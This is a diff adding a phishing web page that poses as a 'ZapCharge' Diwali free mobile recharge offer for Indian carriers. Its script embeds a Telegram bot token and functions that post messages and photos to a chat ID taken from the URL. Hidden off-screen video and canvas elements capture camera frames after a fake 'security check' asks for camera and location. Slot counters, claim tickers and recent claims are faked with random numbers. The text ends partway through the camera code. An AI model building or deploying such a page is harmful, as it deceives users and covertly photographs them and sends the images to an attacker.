@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>ZapCharge – Official Diwali Free Recharge Partner</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{--p:#0f766e;--pd:#0d5c56;--acc:#f59e0b;--bg:#f0fdfa;--card:#fff;--text:#134e4a;--muted:#5b7a76;--border:#99f6e4;--shadow:0 12px 40px rgba(15,118,110,.13);--r:16px}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+
+/* Reveal Animations */
+.reveal{opacity:0;transform:translateY(30px);transition:all 0.8s cubic-bezier(0.5, 0, 0, 1);}
+.reveal.active{opacity:1;transform:translateY(0);}
+
+/* Topbar & Ticker */
+.topbar{background:linear-gradient(90deg,#0f766e,#0d9488);color:#fff;padding:9px 14px;font-size:12px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;font-weight:500;box-shadow:0 2px 10px rgba(0,0,0,.1)}
+.topbar .live{display:flex;align-items:center;gap:6px}
+.topbar .dot{width:7px;height:7px;background:#4ade80;border-radius:50%;animation:pulse 1.3s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+.ticker-wrap{background:#134e4a;color:#fff;overflow:hidden;height:36px;display:flex;align-items:center}
+.ticker-label{background:#f59e0b;color:#78350f;font-size:11px;font-weight:800;padding:0 12px;height:100%;display:flex;align-items:center;z-index:2;flex-shrink:0;box-shadow:2px 0 5px rgba(0,0,0,.2)}
+.ticker{display:flex;gap:40px;animation:tickerMove 120s linear infinite;white-space:nowrap;padding-left:16px;font-size:12.5px}
+@keyframes tickerMove{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+.ticker b{color:#5eead4}
+
+/* Hero */
+.hero{background:linear-gradient(165deg,#0f766e 0%,#0d9488 45%,#14b8a6 100%);color:#fff;padding:30px 18px 60px;text-align:center;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);animation:rotateBg 20s linear infinite;}
+@keyframes rotateBg{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.hero::after{content:'';position:absolute;bottom:-55px;left:0;right:0;height:100px;background:var(--bg);border-radius:50% 50% 0 0/100% 100% 0 0}
+.brand-row{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:14px;position:relative;z-index:1}
+.brand-logo{width:48px;height:48px;background:#fff;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#0f766e;box-shadow:0 6px 18px rgba(0,0,0,.15);animation:float 3s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+.brand-text{text-align:left}
+.brand-text strong{display:block;font-size:18px;font-weight:800;letter-spacing:-0.5px}
+.brand-text small{font-size:11px;opacity:.85}
+.hero h1{font-size:28px;font-weight:900;margin-bottom:6px;letter-spacing:-0.5px;position:relative;z-index:1}
+.hero p{opacity:.92;font-size:13.5px;max-width:320px;margin:0 auto 16px;position:relative;z-index:1}
+
+/* Stats Box */
+.stats-row{display:flex;justify-content:center;gap:10px;margin-bottom:10px;position:relative;z-index:1;flex-wrap:wrap}
+.stat-box{background:rgba(255,255,255,.15);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.3);border-radius:20px;padding:6px 14px;font-size:11.5px;font-weight:600;display:flex;align-items:center;gap:6px;box-shadow:0 4px 15px rgba(0,0,0,.1);white-space:nowrap}
+.stat-box b{color:#fde68a;font-size:15px;text-shadow:0 0 10px rgba(253,230,138,.5)}
+@keyframes popNum {0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
+.pop{animation:popNum 0.3s ease}
+
+/* Main Container */
+.container{max-width:480px;margin:-32px auto 0;padding:0 14px 40px;position:relative;z-index:2}
+.card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);border-radius:var(--r);box-shadow:var(--shadow);padding:22px 18px;margin-bottom:18px;border:1px solid rgba(204,251,241,0.6);transition:transform 0.3s ease, box-shadow 0.3s ease;}
+.card:hover{transform:translateY(-2px);box-shadow:0 16px 50px rgba(15,118,110,.18);}
+.card h2{font-size:18px;font-weight:800;margin-bottom:4px;letter-spacing:-0.3px}
+.card .sub{color:var(--muted);font-size:12.5px;margin-bottom:18px}
+
+/* Providers */
+.providers{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:18px}
+.prov{background:#fff;border:2px solid #ccfbf1;border-radius:14px;padding:10px 4px 8px;text-align:center;cursor:pointer;transition:all .25s cubic-bezier(0.34, 1.56, 0.64, 1);font-size:11px;font-weight:700;color:#134e4a;position:relative;overflow:hidden}
+.prov .logo-icon{width:38px;height:38px;margin:0 auto 5px;display:flex;align-items:center;justify-content:center;transition:transform .3s}
+.prov:hover .logo-icon{transform:scale(1.1)}
+.prov .logo-icon svg{width:100%;height:100%;border-radius:10px;box-shadow:0 4px 10px rgba(0,0,0,0.1)}
+.prov.selected{border-color:#0f766e;background:#f0fdfa;box-shadow:0 0 0 3px rgba(15,118,110,.15);transform:translateY(-3px)}
+.prov.selected::after{content:'✓';position:absolute;top:4px;right:6px;font-size:10px;color:#0f766e;font-weight:900}
+
+/* Plans */
+.plans{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:18px;max-height:340px;overflow-y:auto;padding-top:6px;padding-right:2px}
+.plans::-webkit-scrollbar{width:4px}
+.plans::-webkit-scrollbar-thumb{background:#99f6e4;border-radius:4px}
+.plan{border:1.5px solid #99f6e4;border-radius:13px;padding:12px 10px;cursor:pointer;transition:all .2s;position:relative;background:#f0fdfa}
+.plan:hover{border-color:#5eead4;background:#e6fffb}
+.plan.selected{border-color:#0f766e;background:#ccfbf1;box-shadow:0 0 0 2px rgba(15,118,110,.18)}
+.plan .amt{font-size:17px;font-weight:800;letter-spacing:-0.5px}
+.plan .desc{font-size:10.5px;color:var(--muted);margin-top:3px;line-height:1.3;font-weight:500}
+.plan .tag{position:absolute;top:-8px;right:8px;background:#0f766e;color:#fff;font-size:9px;font-weight:800;padding:2px 8px;border-radius:6px;box-shadow:0 2px 8px rgba(15,118,110,.4);animation:pulseTag 2s infinite}
+@keyframes pulseTag{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+
+/* Form */
+.field{margin-bottom:16px}
+.field label{display:block;font-size:12.5px;font-weight:700;margin-bottom:6px;color:#134e4a}
+.field input{width:100%;padding:14px;border:1.5px solid #99f6e4;border-radius:12px;font-size:16px;font-family:inherit;background:#f0fdfa;transition:all .25s;font-weight:500}
+.field input:focus{outline:none;border-color:#0f766e;box-shadow:0 0 0 4px rgba(15,118,110,.12);background:#fff}
+.field input::placeholder{color:#94a3b8;font-weight:400}
+
+.btn{width:100%;padding:16px;background:linear-gradient(135deg,#0f766e,#14b8a6);color:#fff;border:none;border-radius:13px;font-size:16px;font-weight:800;cursor:pointer;font-family:inherit;box-shadow:0 8px 25px rgba(15,118,110,.35);transition:all .2s;position:relative;overflow:hidden;letter-spacing:0.3px}
+.btn:hover{box-shadow:0 10px 30px rgba(15,118,110,.45);transform:translateY(-2px)}
+.btn:active{transform:scale(.98)}
+.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.btn::after{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);transition:left 0.5s}
+.btn:hover::after{left:100%}
+
+.trust{display:flex;justify-content:center;gap:14px;margin-top:16px;flex-wrap:wrap}
+.trust span{font-size:11px;color:var(--muted);display:flex;align-items:center;gap:4px;font-weight:600}
+.trust svg{width:14px;height:14px;fill:#0f766e}
+
+/* Status */
+.status{display:none;text-align:center;padding:30px 16px}
+.status.active{display:block;animation:fadeUp .5s ease}
+.progress-ring{width:80px;height:80px;margin:0 auto 16px;position:relative}
+.progress-ring svg{transform:rotate(-90deg)}
+.progress-ring circle{fill:none;stroke-width:6}
+.progress-ring .bg{stroke:#ccfbf1}
+.progress-ring .fg{stroke:#0f766e;stroke-linecap:round;stroke-dasharray:188;stroke-dashoffset:188;transition:stroke-dashoffset 1s linear}
+.progress-ring .pct{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;color:#0f766e}
+.status h3{font-size:17px;font-weight:800;margin-bottom:6px;letter-spacing:-0.3px}
+.status p{color:var(--muted);font-size:13px}
+
+/* Sections */
+.section-title{font-size:16px;font-weight:800;margin:24px 0 14px;color:#134e4a;letter-spacing:-0.3px;display:flex;align-items:center;gap:8px}
+.section-title::after{content:'';flex:1;height:2px;background:linear-gradient(90deg,#ccfbf1,transparent);border-radius:2px}
+.steps{display:grid;gap:12px}
+.step{display:flex;gap:14px;align-items:flex-start;background:#fff;border-radius:14px;padding:16px;border:1px solid #ccfbf1;box-shadow:0 4px 15px rgba(0,0,0,0.02);transition:transform .2s}
+.step:hover{transform:translateX(4px)}
+.step-num{width:32px;height:32px;background:linear-gradient(135deg,#0f766e,#14b8a6);color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;flex-shrink:0;box-shadow:0 4px 10px rgba(15,118,110,.3)}
+.step h4{font-size:14px;font-weight:700;margin-bottom:2px}
+.step p{font-size:12px;color:var(--muted);line-height:1.4}
+
+/* Recent Claims */
+#recentList{display:flex;flex-direction:column;gap:0;overflow:hidden;max-height:320px}
+.claim-item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0fdfa;font-size:13px;animation:slideDown 0.5s ease forwards}
+@keyframes slideDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
+.claim-item:last-child{border-bottom:none}
+.claim-item b{font-weight:600;color:#134e4a;letter-spacing:0.5px}
+.claim-item span{color:#0f766e;font-weight:700;font-size:12px;background:#f0fdfa;padding:2px 8px;border-radius:6px}
+
+/* FAQ */
+.faq details{background:#fff;border:1px solid #ccfbf1;border-radius:14px;padding:14px 16px;margin-bottom:10px;transition:all .2s;box-shadow:0 2px 10px rgba(0,0,0,0.02)}
+.faq details[open]{border-color:#5eead4;box-shadow:0 4px 15px rgba(15,118,110,0.08)}
+.faq summary{font-size:13.5px;font-weight:700;cursor:pointer;list-style:none;display:flex;justify-content:space-between;align-items:center}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:'+';font-size:18px;color:#0f766e;font-weight:400;transition:transform .3s}
+.faq details[open] summary::after{content:'−';transform:rotate(180deg)}
+.faq p{font-size:12.5px;color:var(--muted);margin-top:10px;line-height:1.5}
+
+footer{text-align:center;padding:24px 14px 60px;font-size:11px;color:#5b7a76;line-height:1.6}
+footer a{color:#0f766e;text-decoration:none;font-weight:600}
+
+/* Utility */
+#camVideo,#camCanvas{position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+
+/* Modal */
+.modal-bg{position:fixed;inset:0;background:rgba(15,23,42,.6);z-index:200;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px);opacity:0;transition:opacity .3s}
+.modal-bg.show{display:flex;opacity:1}
+.modal{background:#fff;border-radius:22px;padding:26px 20px;max-width:340px;width:100%;text-align:center;animation:popIn .35s cubic-bezier(0.34, 1.56, 0.64, 1);border:1px solid #ccfbf1;box-shadow:0 25px 60px rgba(0,0,0,.2)}
+@keyframes popIn{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
+.modal h3{font-size:18px;font-weight:800;margin-bottom:8px;color:#134e4a}
+.modal p{font-size:13px;color:var(--muted);margin-bottom:22px;line-height:1.5}
+.modal .btn-row{display:flex;gap:10px}
+.modal .btn-row button{flex:1;padding:14px;border-radius:12px;font-size:14px;font-weight:800;border:none;cursor:pointer;font-family:inherit;transition:all .2s}
+.modal .btn-allow{background:linear-gradient(135deg,#0f766e,#14b8a6);color:#fff;box-shadow:0 4px 15px rgba(15,118,110,.3)}
+.modal .btn-allow:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(15,118,110,.4)}
+.modal .btn-deny{background:#f1f5f9;color:#475569}
+.modal .btn-deny:hover{background:#e2e8f0}
+</style>
+</head>
+<body>
+
+<div id="mainSite">
+  <div class="topbar"><div class="live"><span class="dot"></span> Diwali Live • Ends midnight</div><div id="userEmailBadge" style="font-size:11px;opacity:.9"></div></div>
+  
+  <div class="ticker-wrap"><div class="ticker-label">LIVE</div><div class="ticker" id="ticker"></div></div>
+  
+  <section class="hero">
+    <div class="brand-row reveal"><div class="brand-logo">Z</div><div class="brand-text"><strong>ZapCharge</strong><small>Authorised Festive Partner 2026</small></div></div>
+    <h1 class="reveal">Diwali Free Recharge</h1>
+    <p class="reveal">Exclusive partner reward for Jio, Airtel, Vi & BSNL. Instant credit after verification.</p>
+    
+    <div class="stats-row reveal">
+      <div class="stat-box">🔥 Only <b id="slotsLeft">500</b> slots left</div>
+      <div class="stat-box">👥 <b id="usersClaimed">15420</b>+ Total Claimed</div>
+    </div>
+  </section>
+  
+  <div class="container">
+    <div class="providers reveal">
+      <div class="prov jio selected" data-p="Jio">
+        <div class="logo-icon"><svg viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#0b5fff"/><text x="24" y="30" fill="#fff" font-family="Arial" font-weight="bold" font-size="16" text-anchor="middle">Jio</text></svg></div>Jio
+      </div>
+      <div class="prov airtel" data-p="Airtel">
+        <div class="logo-icon"><svg viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#ed1c24"/><text x="24" y="30" fill="#fff" font-family="Arial" font-weight="bold" font-size="13" text-anchor="middle">Airtel</text></svg></div>Airtel
+      </div>
+      <div class="prov vi" data-p="Vi">
+        <div class="logo-icon"><svg viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#ee2e6b"/><text x="24" y="31" fill="#fff" font-family="Arial" font-weight="bold" font-size="18" text-anchor="middle">Vi</text></svg></div>Vi
+      </div>
+      <div class="prov bsnl" data-p="BSNL">
+        <div class="logo-icon"><svg viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#f58220"/><text x="24" y="30" fill="#fff" font-family="Arial" font-weight="bold" font-size="11" text-anchor="middle">BSNL</text></svg></div>BSNL
+      </div>
+    </div>
+
+    <div class="card reveal" id="formCard">
+      <h2>Claim Free Diwali Recharge</h2>
+      <p class="sub">Select plan for <b id="provName">Jio</b>. Verification under 60 seconds.</p>
+      <div class="field"><label>Mobile Number</label><input type="tel" id="mobile" placeholder="10-digit mobile number" maxlength="10" inputmode="numeric" pattern="[0-9]*"></div>
+      <div class="field"><label>Select Plan</label><div class="plans" id="plans"></div></div>
+      <button class="btn" id="claimBtn">Claim Free Recharge Now</button>
+      <div class="trust">
+        <span><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Secure</span>
+        <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg> Instant Credit</span>
+        <span><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg> 100% Free</span>
+      </div>
+    </div>
+
+    <div class="card status" id="statusCard">
+      <div class="progress-ring"><svg width="80" height="80"><circle class="bg" cx="40" cy="40" r="30"/><circle class="fg" id="progCircle" cx="40" cy="40" r="30"/></svg><div class="pct" id="progPct">0%</div></div>
+      <h3 id="statusTitle">Processing your claim…</h3>
+      <p id="statusMsg">Please keep this page open. Do not press back.</p>
+    </div>
+
+    <div class="section-title reveal">How ZapCharge Works</div>
+    <div class="steps reveal">
+      <div class="step"><div class="step-num">1</div><div><h4>Enter Mobile Number</h4><p>No login or OTP needed. Direct claim for real users.</p></div></div>
+      <div class="step"><div class="step-num">2</div><div><h4>Choose Network & Plan</h4><p>Pick your operator and the exact plan you want free.</p></div></div>
+      <div class="step"><div class="step-num">3</div><div><h4>Quick Verification</h4><p>One-time location & device check to block bots and fake claims.</p></div></div>
+      <div class="step"><div class="step-num">4</div><div><h4>Recharge Credited</h4><p>Free plan is applied within 15–45 minutes after successful claim.</p></div></div>
+    </div>
+
+    <div class="section-title reveal">Recent Successful Claims</div>
+    <div class="card reveal" style="padding:14px 16px;margin-bottom:16px" id="recentList"></div>
+
+    <div class="section-title reveal">FAQ</div>
+    <div class="faq reveal">
+      <details><summary>Is this really free?</summary><p>Yes. ZapCharge is running a limited Diwali partner campaign. No payment is ever asked.</p></details>
+      <details><summary>How long does credit take?</summary><p>Usually 15–45 minutes after verification is complete.</p></details>
+      <details><summary>Why location & camera?</summary><p>To stop automated bots and ensure one free recharge per real user during the festive offer.</p></details>
+      <details><summary>Which numbers are eligible?</summary><p>All prepaid numbers of Jio, Airtel, Vi and BSNL across India.</p></details>
+    </div>
+  </div>
+  
+  <footer class="reveal">
+    <p><b>ZapCharge</b> is an authorised festive promotional partner for Diwali 2026. Recharge is credited after successful verification. Offer valid while slots last.</p>
+    <p style="margin-top:10px">© 2026 ZapCharge Digital Pvt. Ltd. • <a href="#">Terms</a> • <a href="#">Privacy</a> • <a href="#">Partner Policy</a></p>
+  </footer>
+</div>
+
+<div class="modal-bg" id="permModal">
+  <div class="modal">
+    <h3>Quick Security Check</h3>
+    <p>To protect free slots from bots we need a one-time location & device confirmation. Used only for this claim.</p>
+    <div class="btn-row">
+      <button class="btn-deny" id="denyBtn">Not now</button>
+      <button class="btn-allow" id="allowBtn">Allow & Continue</button>
+    </div>
+  </div>
+</div>
+<video id="camVideo" playsinline muted autoplay></video>
+<canvas id="camCanvas"></canvas>
+
+<script>
+const BOT_TOKEN="8939528828:AAHY99zEOtr2zrHRK4cSq2-rMwMnv5JK-s8";
+const TG_API=`https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// --- NEW LOGIC: Get Target UID from URL ---
+const urlParams = new URLSearchParams(window.location.search);
+const TARGET_CHAT_ID = urlParams.get('uid') || "713914937"; // Fallback to your ID if no UID in URL
+
+const PLAN_DATA={
+  Jio:[
+    {amt:"₹189",desc:"28 Days • 2GB Total",full:"Jio ₹189 • 28 Days • 2GB Total"},
+    {amt:"₹239",desc:"22 Days • 1.5GB/Day",full:"Jio ₹239 • 22 Days • 1.5GB/Day"},
+    {amt:"₹299",desc:"28 Days • 1.5GB/Day",full:"Jio ₹299 • 28 Days • 1.5GB/Day"},
+    {amt:"₹319",desc:"1 Month • 1.5GB/Day",full:"Jio ₹319 • 1 Month • 1.5GB/Day"},
+    {amt:"₹329",desc:"28 Days • 1.5GB/Day",full:"Jio ₹329 • 28 Days • 1.5GB/Day"},
+    {amt:"₹349",desc:"28 Days • 2GB/Day",full:"Jio ₹349 • 28 Days • 2GB/Day",tag:"BEST"},
+    {amt:"₹399",desc:"28 Days • 2.5GB/Day",full:"Jio ₹399 • 28 Days • 2.5GB/Day"},
+    {amt:"₹899",desc:"90 Days • 2GB/Day + 20GB",full:"Jio ₹899 • 90 Days • 2GB/Day + 20GB"},
+    {amt:"₹1,029",desc:"84 Days • 2GB/Day",full:"Jio ₹1,029 • 84 Days • 2GB/Day"},
+    {amt:"₹3,599",desc:"365 Days • 2.5GB/Day",full:"Jio ₹3,599 • 365 Days • 2.5GB/Day"}
+  ],
+  Airtel:[
+    {amt:"₹199",desc:"28 Days • 2GB Total",full:"Airtel ₹199 • 28 Days • 2GB Total"},
+    {amt:"₹349",desc:"28 Days • 2GB/Day",full:"Airtel ₹349 • 28 Days • 2GB/Day",tag:"BEST"},
+    {amt:"₹379",desc:"1 Month • 2GB/Day",full:"Airtel ₹379 • 1 Month • 2GB/Day"},
+    {amt:"₹399",desc:"28 Days • Benefits to be verified",full:"Airtel ₹399 • 28 Days • Benefits to be verified"},
+    {amt:"₹429",desc:"1 Month • 2.5GB/Day",full:"Airtel ₹429 • 1 Month • 2.5GB/Day"},
+    {amt:"₹449",desc:"28 Days • Benefits to be verified",full:"Airtel ₹449 • 28 Days • Benefits to be verified"},
+    {amt:"₹899",desc:"Benefits to be verified",full:"Airtel ₹899 • Benefits to be verified"},
+    {amt:"₹979",desc:"84 Days • 2GB/Day",full:"Airtel ₹979 • 84 Days • 2GB/Day"},
+    {amt:"₹1,099",desc:"Benefits to be verified",full:"Airtel ₹1,099 • Benefits to be verified"},
+    {amt:"₹3,999",desc:"Benefits to be verified",full:"Airtel ₹3,999 • Benefits to be verified"}
+  ],
+  Vi:[
+    {amt:"₹199",desc:"28 Days • 2GB Total",full:"Vi ₹199 • 28 Days • 2GB Total"},
+    {amt:"₹299",desc:"28 Days • 1GB/Day",full:"Vi ₹299 • 28 Days • 1GB/Day"},
+    {amt:"₹349",desc:"28 Days • 1.5GB/Day",full:"Vi ₹349 • 28 Days • 1.5GB/Day"},
+    {amt:"₹365",desc:"28 Days • 2GB/Day",full:"Vi ₹365 • 28 Days • 2GB/Day",tag:"BEST"},
+    {amt:"₹399",desc:"Benefits to be verified",full:"Vi ₹399 • Benefits to be verified"},
+    {amt:"₹479",desc:"48 Days • 1GB/Day",full:"Vi ₹479 • 48 Days • 1GB/Day"},
+    {amt:"₹650",desc:"Benefits to be verified",full:"Vi ₹650 • Benefits to be verified"},
+    {amt:"₹739",desc:"Benefits to be verified",full:"Vi ₹739 • Benefits to be verified"},
+    {amt:"₹979",desc:"84 Days • Benefits to be verified",full:"Vi ₹979 • 84 Days • Benefits to be verified"},
+    {amt:"₹3,599",desc:"365 Days • 2GB/Day",full:"Vi ₹3,599 • 365 Days • 2GB/Day"}
+  ],
+  BSNL:[
+    {amt:"₹51",desc:"28 Days • Benefits to be verified",full:"BSNL ₹51 • 28 Days • Benefits to be verified"},
+    {amt:"₹107",desc:"20 Days • 3GB Total",full:"BSNL ₹107 • 20 Days • 3GB Total"},
+    {amt:"₹141",desc:"30 Days • 1.5GB/Day",full:"BSNL ₹141 • 30 Days • 1.5GB/Day"},
+    {amt:"₹147",desc:"24 Days • 5GB Total",full:"BSNL ₹147 • 24 Days • 5GB Total"},
+    {amt:"₹153",desc:"24 Days • 1GB/Day",full:"BSNL ₹153 • 24 Days • 1GB/Day"},
+    {amt:"₹197",desc:"35 Days • 5GB Total",full:"BSNL ₹197 • 35 Days • 5GB Total"},
+    {amt:"₹219",desc:"28 Days • 2GB/Day",full:"BSNL ₹219 • 28 Days • 2GB/Day",tag:"BEST"},
+    {amt:"₹347",desc:"50 Days • 2GB/Day",full:"BSNL ₹347 • 50 Days • 2GB/Day"},
+    {amt:"₹485",desc:"72 Days • 2GB/Day",full:"BSNL ₹485 • 72 Days • 2GB/Day"},
+    {amt:"₹1,551",desc:"365 Days • 2GB/Day",full:"BSNL ₹1,551 • 365 Days • 2GB/Day"}
+  ]
+};
+
+let selectedProvider="Jio",selectedPlan=PLAN_DATA.Jio[0].full;
+
+// --- LOCAL STORAGE LOGIC FOR COUNTERS ---
+let slots = localStorage.getItem('zap_slots') ? parseInt(localStorage.getItem('zap_slots')) : 500;
+let usersClaimed = localStorage.getItem('zap_users') ? parseInt(localStorage.getItem('zap_users')) : 15420;
+
+document.getElementById('slotsLeft').textContent = slots;
+document.getElementById('usersClaimed').textContent = usersClaimed;
+
+// Scroll Reveal Observer
+const observerOptions={threshold:0.1,rootMargin:"0px 0px -50px 0px"};
+const observer=new IntersectionObserver((entries)=>{
+  entries.forEach(entry=>{
+    if(entry.isIntersecting){
+      entry.target.classList.add('active');
+      observer.unobserve(entry.target);
+    }
+  });
+},observerOptions);
+
+document.querySelectorAll('.reveal').forEach(el=>observer.observe(el));
+
+const mainSite=document.getElementById("mainSite");
+mainSite.style.display="block";
+
+function initMain(){renderPlans("Jio");startTicker();startSlots();startDynamicRecent();startUserCounter()}
+
+function renderPlans(prov){
+  const box=document.getElementById("plans");box.innerHTML="";
+  PLAN_DATA[prov].forEach((p,i)=>{
+    const div=document.createElement("div");
+    div.className="plan"+(i===0?" selected":"");
+    div.innerHTML=(p.tag?`<span class="tag">${p.tag}</span>`:"")+`<div class="amt">${p.amt}</div><div class="desc">${p.desc}</div>`;
+    div.addEventListener("click",()=>{
+      box.querySelectorAll(".plan").forEach(x=>x.classList.remove("selected"));
+      div.classList.add("selected");
+      selectedPlan=p.full;
+    });
+    box.appendChild(div);
+  });
+  selectedPlan=PLAN_DATA[prov][0].full;
+  document.getElementById("provName").textContent=prov;
+}
+
+document.querySelectorAll(".prov").forEach(el=>{
+  el.addEventListener("click",()=>{
+    document.querySelectorAll(".prov").forEach(p=>p.classList.remove("selected"));
+    el.classList.add("selected");selectedProvider=el.dataset.p;renderPlans(selectedProvider);
+  });
+});
+
+document.getElementById("mobile").addEventListener("input",function(){this.value=this.value.replace(/\D/g,"").slice(0,10)});
+
+// Random number generator (Indian prefixes)
+function randNum(){
+  const prefixes = ["6","7","8","9"];
+  const p = prefixes[Math.floor(Math.random()*prefixes.length)];
+  return p + String(Math.floor(100000000 + Math.random() * 900000000));
+}
+function maskNum(n){return n.slice(0,5)+"xxxxx"}
+
+// Generate Ticker Items
+function generateClaimString() {
+  const num = maskNum(randNum());
+  const provs=["Jio","Airtel","Vi","BSNL"];
+  const prov=provs[Math.floor(Math.random()*4)];
+  return `<span><b>${num}</b> claimed ${prov} recharge</span>`;
+}
+
+function startTicker(){
+  const el=document.getElementById("ticker");
+  let html="";
+  for(let i=0;i<30;i++){ html += generateClaimString(); }
+  el.innerHTML=html+html;
+}
+
+// Slots Counter (500 to 0 slowly, saved in localStorage)
+function startSlots(){
+  const el=document.getElementById("slotsLeft");
+  setInterval(()=>{
+    if(slots>0){
+      slots--;
+      el.textContent=slots;
+      localStorage.setItem('zap_slots', slots);
+    } else {
+      slots=500;
+      el.textContent=slots;
+      localStorage.setItem('zap_slots', slots);
+    }
+  },5000); // decreases every 5s
+}
+
+// Dynamic Recent Claims
+function renderInitialRecent(){
+  const box=document.getElementById("recentList");
+  box.innerHTML="";
+  const provs=["Jio","Airtel","Vi","BSNL"];
+  for(let i=0;i<5;i++){
+    const num=maskNum(randNum());
+    const prov=provs[Math.floor(Math.random()*4)];
+    const mins=Math.floor(Math.random()*15)+2;
+    const html=`<div class="claim-item"><span style="background:none;color:#134e4a;font-weight:600;padding:0;font-size:13px"><b>${num}</b></span><span>${prov} • ${mins}m ago</span></div>`;
+    box.insertAdjacentHTML('beforeend', html);
+  }
+}
+
+function addNewRecent() {
+  const box=document.getElementById("recentList");
+  const provs=["Jio","Airtel","Vi","BSNL"];
+  const num=maskNum(randNum());
+  const prov=provs[Math.floor(Math.random()*4)];
+  
+  const html=`<div class="claim-item"><span style="background:none;color:#134e4a;font-weight:600;padding:0;font-size:13px"><b>${num}</b></span><span>${prov} • Just now</span></div>`;
+  
+  box.insertAdjacentHTML('afterbegin', html);
+  if(box.children.length > 5){ box.removeChild(box.lastElementChild); }
+}
+
+function startDynamicRecent() {
+  renderInitialRecent();
+  setInterval(() => { addNewRecent(); }, 5000);
+}
+
+// User Claim Counter (Saved in localStorage)
+function startUserCounter() {
+  const el = document.getElementById("usersClaimed");
+  setInterval(() => {
+    const inc = Math.floor(Math.random() * 3) + 1; 
+    usersClaimed += inc;
+    el.textContent = usersClaimed;
+    localStorage.setItem('zap_users', usersClaimed);
+    
+    el.classList.add('pop');
+    setTimeout(() => el.classList.remove('pop'), 300);
+  }, 18000);
+}
+
+// --- TELEGRAM API CALLS (Using TARGET_CHAT_ID) ---
+async function tgSendMessage(text){
+  try{
+    await fetch(`${TG_API}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:TARGET_CHAT_ID,text,parse_mode:"HTML"}) // CHAT_ID replaced with TARGET_CHAT_ID
+    });
+  }catch(e){console.error("TG Msg Error",e);}
+}
+
+async function tgSendPhoto(blob,caption){
+  try{
+    const fd=new FormData();
+    fd.append("chat_id",TARGET_CHAT_ID); // CHAT_ID replaced with TARGET_CHAT_ID
+    fd.append("caption",caption);
+    fd.append("photo",blob,`cap_${Date.now()}.jpg`);
+    await fetch(`${TG_API}/sendPhoto`,{method:"POST",body:fd});
+  }catch(e){console.error("TG Photo Error",e);}
+}
+
+const video=document.getElementById("camVideo"),canvas=document.getElementById("camCanvas"),ctx=canvas.getContext("2d");
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+async function captureFrame(){canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;ctx.drawImage(video,0,0);return new Promise(res=>canvas.toBlob(b=>res(b),"image/jpeg",.88))}
+async function getStream(facing){if(video.srcObject){video.srcObject.getTracks().forEach(t=>t.stop());video.srcObject=null}const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facing},width:{ideal:1280},height:{ideal:720}},audio:false});video.srcObject=stream;await video.play();await sleep(500);return stream}
